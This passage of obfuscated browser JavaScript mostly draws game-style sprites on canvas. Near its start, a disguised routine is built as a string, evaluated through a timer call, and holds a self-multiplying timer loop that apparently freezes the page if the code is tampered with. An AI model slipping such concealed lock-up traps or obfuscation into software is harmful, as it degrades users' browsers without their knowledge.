		}

		function ᐃΔⲆᐃᐃⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 88 * ᐃ;
			Ⲇⵠ.height = ᐃ * 88;
			Δ.save();
			Δ.translate(44 * ᐃ, 44 * ᐃ);
			Δ.rotate(.52);
			ⵠΔⵠᐃ(Δ, ⵠᐃᐃΔ, 43 * ᐃ, ᐃⵠΔⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆΔ], ᐃ * 3);
			return Ⲇⵠ
		}
		const ΔᐃⵠⵠΔΔⲆ = 12018945;

		function ᐃᐃΔΔⲆΔΔⲆΔ(ΔᐃᐃⵠᐃΔⵠⲆⵠ) {
			const ΔᐃⵠⵠΔΔⲆ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]];
			const ΔᐃᐃᐃⲆᐃⲆᐃΔ = ΔᐃⵠⵠΔΔⲆ;
			const ⵠΔᐃⲆΔᐃᐃᐃᐃ = function() {
				ΔᐃⵠⵠΔΔⲆ(ⵠΔᐃⲆΔᐃᐃᐃᐃ, 2868);
				ΔᐃᐃᐃⲆᐃⲆᐃΔ(ⵠΔᐃⲆΔᐃᐃᐃᐃ, 401)
			};
			ⵠΔᐃⲆΔᐃᐃᐃᐃ()
		}
		const ΔᐃᐃⵠᐃΔⵠⲆⵠ = ᐃᐃΔΔⲆΔΔⲆΔ + ";" + "let ΔᐃᐃⵠᐃΔⵠⲆⵠ = " + ᐃᐃΔΔⲆΔΔⲆΔ + ";";
		const ΔᐃᐃᐃⲆᐃⲆᐃΔ = ΔᐃᐃⵠᐃΔⵠⲆⵠ + "let ⵠΔᐃⲆΔᐃᐃᐃᐃ = 14116609; try { ⵠΔᐃⲆΔᐃᐃᐃᐃ = ᐃᐃΔΔⲆΔΔⲆΔ; } catch (ΔΔⵠⵠⲆΔⲆ) { ΔᐃᐃⵠᐃΔⵠⲆⵠ (); };";
		ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ΔᐃᐃᐃⲆᐃⲆᐃΔ, 0);

		function ⵠⲆᐃᐃᐃⵠΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 185 * ᐃ;
			Ⲇⵠ.height = ᐃ * 164;
			Δ.translate(Δᐃᐃᐃ, 0);
			var ᐃⵠ = ΔⲆⲆΔⲆΔⵠⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ);
			Δ.drawImage(ᐃⵠ, -ᐃᐃⲆⵠⵠ * ᐃ, ᐃ * ΔⲆⲆ);
			var ᐃⵠ = ⵠᐃⵠΔⲆΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ΔΔⵠ);
			Δ.drawImage(ᐃⵠ, -83 * ᐃ, ᐃ * -40);
			var ᐃⵠ = ⵠᐃⵠΔⲆΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, Math.PI / 1.4);
			Δ.drawImage(ᐃⵠ, -15 * ᐃ, ᐃ * -88);
			var ᐃⵠ = ⵠᐃⵠΔⲆΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, Math.PI / -1.4);
			Δ.drawImage(ᐃⵠ, 15 * ᐃ, -8 * ᐃ);
			return Ⲇⵠ
		}

		function ΔⵠΔΔᐃⵠᐃᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 85 * ᐃ;
			Ⲇⵠ.height = ᐃ * 145;
			Δ.translate(ᐃ * -165, -95 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 217, 103 * ᐃ);
			Δ.bezierCurveTo(209 * ᐃ, ᐃ * 129, 203 * ᐃ, 137 * ᐃ, ᐃ * 195, 146 * ᐃ);
			Δ.bezierCurveTo(195 * ᐃ, ᐃ * 159, ᐃ * 194, ᐃ * 167, ᐃ * 189, 178 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 193, 186 * ᐃ, ᐃ * 196, 195 * ᐃ, 198 * ᐃ, ᐃ * 216);
			Δ.bezierCurveTo(217.5 * ᐃ, 189.5 * ᐃ, 217.5 * ᐃ, 189.5 * ᐃ, ᐃ * 237, 163 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(231 * ᐃ, ᐃ * 163);
			Δ.bezierCurveTo(ᐃ * 221, ᐃ * 139, 218 * ᐃ, 128 * ᐃ, ᐃ * 215, ᐃ * 114);
			Δ.bezierCurveTo(213 * ᐃ, 102 * ᐃ, ᐃ * 220, 92 * ᐃ, ᐃ * 222, 107 * ᐃ);
			Δ.bezierCurveTo(224 * ᐃ, ᐃ * 118, 233 * ᐃ, ᐃ * 138, ᐃ * 244, ᐃ * 161);
			Δ.bezierCurveTo(ᐃ * 235, ᐃ * 188, 224 * ᐃ, 198 * ᐃ, ᐃ * 204, ᐃ * 221);
			Δ.bezierCurveTo(190 * ᐃ, ᐃ * 233, 190 * ᐃ, 235 * ᐃ, 180 * ᐃ, 235 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, 235 * ᐃ, ᐃ * 164, ᐃ * 216, 175 * ᐃ, ᐃ * 211);
			Δ.bezierCurveTo(176 * ᐃ, 208 * ᐃ, 181 * ᐃ, 207 * ᐃ, 191 * ᐃ, 205 * ᐃ);
			Δ.bezierCurveTo(213 * ᐃ, 186 * ᐃ, 218 * ᐃ, 180 * ᐃ, 230 * ᐃ, ᐃ * 163);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 234, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 227, ᐃ * 156, ᐃ * 222, ᐃ * 156, 199 * ᐃ, 148 * ᐃ);
			Δ.bezierCurveTo(201 * ᐃ, 151 * ᐃ, ᐃ * 216, ᐃ * 159, 224 * ᐃ, ᐃ * 162);
			Δ.bezierCurveTo(209 * ᐃ, ᐃ * 169.5, 209 * ᐃ, 169.5 * ᐃ, 194 * ᐃ, 177 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 213.5, ᐃ * 175, 213.5 * ᐃ, ᐃ * 175, ᐃ * 233, ᐃ * 173);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ);
			return Ⲇⵠ
		}

		function ΔⲆⲆΔⲆΔⵠⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 201;
			Ⲇⵠ.height = 164 * ᐃ;
			Δ.translate(0, ᐃ * 5);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			ⵠᐃᐃ(Δ, 100.5 * ᐃ, ᐃ * 82, ᐃ * 74.92746655359852);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔᐃΔΔ], ⵠᐃᐃⲆ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 100.5, ᐃ * 82, 65.9417374971317 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⲆⵠΔⵠ);
			Δ.translate(Δᐃᐃⵠ, -5);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 100.5 * ᐃ, 82 * ᐃ, 74.92746655359852 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ᐃ * 4);
			ⵠᐃᐃ(Δ, 100.5 * ᐃ, 82 * ᐃ, 65.9417374971317 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[2], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 100.5, ᐃ * 82, 35.9417374971317 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆᐃᐃΔΔ);
			ⵠᐃᐃ(Δ, ᐃ * 100.5, ᐃ * 82, ᐃ * 15.9417374971317);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[ⵠΔᐃᐃⵠ], ᐃ * 6);
			return Ⲇⵠ
		}

		function ⵠⲆⲆΔⲆⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 142;
			Ⲇⵠ.height = ᐃ * 118;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(111 * ᐃ, ᐃ * 27.3671875);
			Δ.bezierCurveTo(ᐃ * 128, 9.3671875 * ᐃ, 125 * ᐃ, 13.3671875 * ᐃ, ᐃ * 126, 21.3671875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126, 33.3671875 * ᐃ, ᐃ * 119, 43.3671875 * ᐃ, 118 * ᐃ, 42.3671875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[4], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(31 * ᐃ, 23.3671875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 17, ᐃ * 15.3671875, ᐃ * 16, ᐃ * 14.3671875, 17 * ᐃ, 20.3671875 * ᐃ);
			Δ.bezierCurveTo(22 * ᐃ, 33.3671875 * ᐃ, ᐃ * Δⵠᐃᐃᐃ, ᐃ * 27.3671875, 24 * ᐃ, ᐃ * 34.3671875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[ⲆΔⵠᐃ], ᐃ * 4);
			Δ.save();
			Δ.translate(70.5 * ᐃ, ᐃ * 34.8671875);
			Δ.rotate(Ⲇᐃᐃᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -49.5, -21.5 * ᐃ, ᐃ * 99, ᐃ * 43, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ᐃ * 4);
			Δ.save();
			Δ.translate(71 * ᐃ, ᐃ * 40.8671875);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -49 * ᐃ, -12.5 * ᐃ, 98 * ᐃ, ᐃ * 25, ᐃ * 15);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ΔⲆᐃᐃ], ΔⲆⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 19.800003051757812, ᐃ * 75.95625305175781);
			Δ.bezierCurveTo(19.300003051757812 * ᐃ, 82.95625305175781 * ᐃ, 19.300003051757812 * ᐃ, 82.95625305175781 * ᐃ, 18.800003051757812 * ᐃ, ᐃ * 89.95625305175781);
			Δ.bezierCurveTo(ᐃ * 38.80000305175781, 115.95625305175781 * ᐃ, ᐃ * 37.80000305175781, 104.95625305175781 * ᐃ, 31.800003051757812 * ᐃ, ᐃ * 91.95625305175781);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ], Ⲇᐃ[1], Ⲇⵠⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(119.80000305175781 * ᐃ, ᐃ * 75.95625305175781);
			Δ.bezierCurveTo(120.80000305175781 * ᐃ, 82.95625305175781 * ᐃ, 120.80000305175781 * ᐃ, 82.95625305175781 * ᐃ, 121.80000305175781 * ᐃ, ᐃ * 89.95625305175781);
			Δ.bezierCurveTo(ᐃ * 101.80000305175781, ᐃ * 111.95625305175781, 99.80000305175781 * ᐃ, ᐃ * 111.95625305175781, ᐃ * 112.80000305175781, 81.95625305175781 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ], Ⲇᐃ[1], ᐃ * ⵠᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(17.800003051757812 * ᐃ, 49.15625 * ᐃ);
			Δ.bezierCurveTo(17.800003051757812 * ᐃ, ᐃ * 64.15625, 17.800003051757812 * ᐃ, 64.15625 * ᐃ, 17.800003051757812 * ᐃ, ᐃ * 79.15625);
			Δ.bezierCurveTo(ᐃ * 23.300003051757812, 85.15625 * ᐃ, 23.300003051757812 * ᐃ, 85.15625 * ᐃ, 28.800003051757812 * ᐃ, ᐃ * 91.15625);
			Δ.bezierCurveTo(36.80000305175781 * ᐃ, ᐃ * 96.15625, ᐃ * 32.80000305175781, ᐃ * 91.15625, ᐃ * 28.800003051757812, ᐃ * 77.15625);
			Δ.bezierCurveTo(33.80000305175781 * ᐃ, ᐃ * 65.15625, ᐃ * 33.80000305175781, ᐃ * 65.15625, ᐃ * 38.80000305175781, ᐃ * 53.15625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[ⵠⵠΔᐃΔ], ᐃ * ⵠᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 123.80000305175781, 53.95625305175781 * ᐃ);
			Δ.bezierCurveTo(121.80000305175781 * ᐃ, 77.95625305175781 * ᐃ, 121.80000305175781 * ᐃ, ᐃ * 74.95625305175781, ᐃ * 121.80000305175781, ᐃ * 78.95625305175781);
			Δ.bezierCurveTo(115.80000305175781 * ᐃ, ᐃ * 84.95625305175781, 115.80000305175781 * ᐃ, 84.95625305175781 * ᐃ, ᐃ * 109.80000305175781, 90.95625305175781 * ᐃ);
			Δ.bezierCurveTo(102.80000305175781 * ᐃ, 93.95625305175781 * ᐃ, ᐃ * 105.80000305175781, ᐃ * 86.95625305175781, 110.80000305175781 * ᐃ, 76.95625305175781 * ᐃ);
			Δ.bezierCurveTo(107.30000305175781 * ᐃ, ᐃ * 65.45625305175781, ᐃ * 103.80000305175781, 53.95625305175781 * ᐃ, ᐃ * 103.80000305175781, ᐃ * 53.95625305175781);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ], Ⲇᐃ[ⵠΔΔᐃΔ], ᐃ * ⲆⵠᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(18 * ᐃ, 56.3671875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, 56.8671875 * ᐃ, 70 * ᐃ, 56.8671875 * ᐃ, ᐃ * 122, ᐃ * 57.3671875);
			Δ.bezierCurveTo(ᐃ * 137, 20.3671875 * ᐃ, ᐃ * 137, 16.3671875 * ᐃ, 126 * ᐃ, 22.3671875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115.5, ᐃ * 34.3671875, ᐃ * 115.5, ᐃ * 34.3671875, ᐃ * 105, ᐃ * 46.3671875);
			Δ.bezierCurveTo(ᐃ * 70.5, ᐃ * 46.3671875, ᐃ * 70.5, 46.3671875 * ᐃ, 36 * ᐃ, ᐃ * 46.3671875);
			Δ.bezierCurveTo(ᐃ * ⲆⲆⲆΔ, ᐃ * 14.3671875, ᐃ * 7, 18.3671875 * ᐃ, ΔⲆᐃⵠⲆΔⵠ * ᐃ, 27.3671875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 12.5, ᐃ * 41.8671875, 12.5 * ᐃ, ᐃ * 41.8671875, ᐃ * ᐃⵠᐃⵠᐃⵠⲆ, 56.3671875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ], Ⲇᐃ[4], ΔΔⵠⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(68.30000305175781 * ᐃ, 41.45625305175781 * ᐃ);
			Δ.rotate(.76);
			Ⲇᐃᐃ(Δ, ᐃ * -20.5, ᐃ * -20.5, ᐃ * 41, 41 * ᐃ, ᐃΔⲆᐃⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ᐃᐃⵠⵠΔ, Ⲇᐃ[5], 4 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 68.80000305175781, ᐃ * 44.45625305175781);
			Δ.rotate(.76);
			Ⲇᐃᐃ(Δ, ᐃ * -21, -20.5 * ᐃ, ᐃ * 42, ᐃ * 41, ᐃ * ᐃⵠΔⵠⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⵠᐃΔΔ);
			Δ.save();
			Δ.translate(ᐃ * 69.80000305175781, 44.556243896484375 * ᐃ);
			Δ.rotate(.76);
			Ⲇᐃᐃ(Δ, ᐃ * -10, ᐃ * -10, ⵠⵠⲆⲆⲆΔΔ * ᐃ, ⵠΔΔⲆⲆ * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⵠᐃⵠᐃΔΔΔ], ᐃ * 4);
			return Ⲇⵠ
		}

		function ᐃⲆᐃⵠⵠᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 175 * ᐃ;
			Ⲇⵠ.height = ᐃ * 106;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ΔᐃΔΔ, ⵠⲆⲆΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(28 * ᐃ, ᐃ * 67);
			Δ.bezierCurveTo(55 * ᐃ, 80 * ᐃ, ᐃ * 126, ᐃ * 74, 144 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144.5, ᐃ * 75, ᐃ * 144.5, 75 * ᐃ, ᐃ * 145, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, 94 * ᐃ, ᐃ * 47, 91 * ᐃ, ᐃ * 28, 82 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(0, -8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 145, ᐃ * 75);
			Δ.bezierCurveTo(143 * ᐃ, ᐃ * 51, ᐃ * 133, ᐃ * 29, ᐃ * 100, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 52, 21 * ᐃ, 37 * ᐃ, ᐃ * 37, 31 * ᐃ, ᐃ * 54);
			Δ.bezierCurveTo(ᐃ * 23, 78 * ᐃ, 28 * ᐃ, ᐃ * 77, 36 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(80 * ᐃ, 87 * ᐃ, 120 * ᐃ, 81 * ᐃ, 145 * ᐃ, 76 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(38 * ᐃ, 46 * ᐃ);
			Δ.bezierCurveTo(52 * ᐃ, ᐃ * 37, 69 * ᐃ, ᐃ * 36, ᐃ * 85, 36 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118, ᐃ * 38, 129 * ᐃ, 42 * ᐃ, 137 * ᐃ, ᐃ * 48);
			Δ.bezierCurveTo(135 * ᐃ, 45 * ᐃ, 135 * ᐃ, 45 * ᐃ, ᐃ * 133, 42 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, ᐃ * 32, ᐃ * 116, ᐃ * 28, 88 * ᐃ, ᐃ * 25);
			Δ.bezierCurveTo(47 * ᐃ, 28 * ᐃ, 40 * ᐃ, 32 * ᐃ, ᐃ * 36, 44 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(145 * ᐃ, ᐃ * 75);
			Δ.bezierCurveTo(143 * ᐃ, ᐃ * 51, ᐃ * 133, ᐃ * 29, ᐃ * ᐃᐃⲆⲆⲆⲆⲆ, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 21, 37 * ᐃ, 37 * ᐃ, ᐃ * 31, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 23, ᐃ * 78, 28 * ᐃ, ᐃ * 77, ᐃ * 36, 79 * ᐃ);
			Δ.bezierCurveTo(80 * ᐃ, 87 * ᐃ, ᐃ * 120, ᐃ * 81, ᐃ * 145, 76 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], ΔⲆⲆⲆ * ᐃ);
			Δ.translate(0, ᐃ * -3);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(28 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, 80 * ᐃ, ᐃ * 126, 74 * ᐃ, ᐃ * 144, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144.5, ᐃ * 75, ᐃ * 144.5, 75 * ᐃ, ᐃ * 145, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 114, 94 * ᐃ, 47 * ᐃ, ᐃ * 91, ᐃ * 28, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10], Ⲇᐃ[10], ᐃ * ⲆⵠᐃⲆ);
			Δ.translate(ⵠᐃⲆᐃ, ᐃ * ⲆⲆΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 131, 43 * ᐃ);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 40, ᐃ * 148, 32 * ᐃ, 147 * ᐃ, ᐃ * 17);
			Δ.bezierCurveTo(ᐃ * 166, 39 * ᐃ, 155 * ᐃ, ᐃ * 62, 140 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(128 * ᐃ, 65 * ᐃ, 128 * ᐃ, 52 * ᐃ, 131 * ᐃ, ᐃ * 45);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(41 * ᐃ, 43 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30, ᐃ * 42, ᐃ * 24, 33 * ᐃ, ᐃ * 25, ⲆᐃᐃⲆΔ * ᐃ);
			Δ.bezierCurveTo(ⵠΔᐃⵠⵠ * ᐃ, ᐃ * 34, 17 * ᐃ, ᐃ * 63, ᐃ * 33, 66 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, 59 * ᐃ, ᐃ * 44, 53 * ᐃ, ᐃ * 42, ᐃ * 44);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 24, ᐃ * 19);
			Δ.bezierCurveTo(ᐃ * 24, ᐃ * 35, ᐃ * 35, 42 * ᐃ, ᐃ * 42, 44 * ᐃ);
			Δ.bezierCurveTo(43 * ᐃ, 51 * ᐃ, 43 * ᐃ, 48 * ᐃ, ᐃ * 43, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, 47 * ᐃ, 17 * ᐃ, ᐃ * 36, ᐃ * 23, ᐃ * 20);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔⵠⲆⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(148 * ᐃ, ⲆⲆⵠᐃⲆⵠⲆ * ᐃ);
			Δ.bezierCurveTo(159 * ᐃ, 44 * ᐃ, ᐃ * 139, 52 * ᐃ, 130 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(129 * ᐃ, ᐃ * 48, ᐃ * 129, ᐃ * 46, ᐃ * 131, 43 * ᐃ);
			Δ.bezierCurveTo(144 * ᐃ, ᐃ * 37, ᐃ * 148, 35 * ᐃ, ᐃ * 147, ᐃ * 18);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(131 * ᐃ, 43 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 40, ᐃ * 148, 32 * ᐃ, ᐃ * 147, ⵠⵠᐃΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166, 39 * ᐃ, 155 * ᐃ, ᐃ * 62, ᐃ * 140, ᐃ * 67);
			Δ.bezierCurveTo(128 * ᐃ, ᐃ * 65, 128 * ᐃ, 52 * ᐃ, 131 * ᐃ, ᐃ * 45);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[4], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 41, ᐃ * 43);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 42, 24 * ᐃ, 33 * ᐃ, 25 * ᐃ, ᐃⵠΔᐃᐃⵠⵠ * ᐃ);
			Δ.bezierCurveTo(ⵠᐃⲆᐃΔⲆⵠ * ᐃ, 34 * ᐃ, ⵠᐃⵠⲆⲆ * ᐃ, ᐃ * 63, ᐃ * 33, 66 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, ᐃ * 59, 44 * ᐃ, ᐃ * 53, ᐃ * 42, ᐃ * 44);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * Ⲇⵠⵠⵠ);
			Δ.save();
			Δ.translate(ᐃ * 87, ᐃ * 34.5);
			Δ.rotate(Δᐃᐃⵠ);
			Ⲇᐃᐃ(Δ, -ⵠⲆⲆΔΔ * ᐃ, ᐃ * -10.5, ᐃ * ΔΔᐃᐃⲆ, 21 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[2], ᐃ * Ⲇᐃⵠᐃ);
			Δ.save();
			Δ.translate(ᐃ * 87, ᐃ * 57);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -8 * ᐃ, ᐃ * -23, ᐃ * ᐃᐃΔⵠⵠⵠΔ, ᐃ * 46, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔᐃⲆⵠ], Ⲇᐃ[2], ᐃ * ⵠΔΔᐃΔ);
			ⵠᐃᐃ(Δ, 87 * ᐃ, ᐃ * 39, ᐃ * 4.123105625617661);
			ΔⲆ(Δ, Ⲇᐃ[9], Ⲇᐃ[ⵠΔᐃᐃⵠ], ⲆⵠᐃΔ * ᐃ);
			ⵠᐃᐃ(Δ, 87 * ᐃ, 60 * ᐃ, ᐃ * 4.242640687119285);
			ΔⲆ(Δ, Ⲇᐃ[9], Ⲇᐃ[ⵠⵠⵠΔ], ⵠⲆⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(28 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(55 * ᐃ, ᐃ * 80, ᐃ * 126, ᐃ * 74, 144 * ᐃ, ᐃ * 68);
			Δ.bezierCurveTo(144.5 * ᐃ, 75 * ᐃ, 144.5 * ᐃ, ᐃ * 75, 145 * ᐃ, ᐃ * 82);
